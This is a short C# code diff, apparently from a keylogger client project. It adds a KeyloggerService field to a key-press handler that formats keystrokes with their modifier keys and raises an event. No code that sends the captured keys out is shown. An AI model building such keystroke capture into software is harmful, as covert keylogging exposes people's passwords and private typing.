@@ -16,11 +16,14 @@ namespace Client
         public string LastKeyText { get; private set; }
 
 
+        public KeyloggerService sendVari;
+
         public event Action<string> OnKeyPressed;
 
         public void KeyDown(Keys key, bool ctrl, bool shift, bool alt)
         {
             string keyText = "";
+            sendVari = new KeyloggerService();
 
             if (ctrl) keyText += "Ctrl + ";
             if (shift) keyText += "Shift + ";
@@ -29,6 +32,8 @@ namespace Client
             keyText += key.ToString();
 
             LastKeyText = keyText;
+
+            
 
 
             if (OnKeyPressed != null) OnKeyPressed.Invoke(keyText);
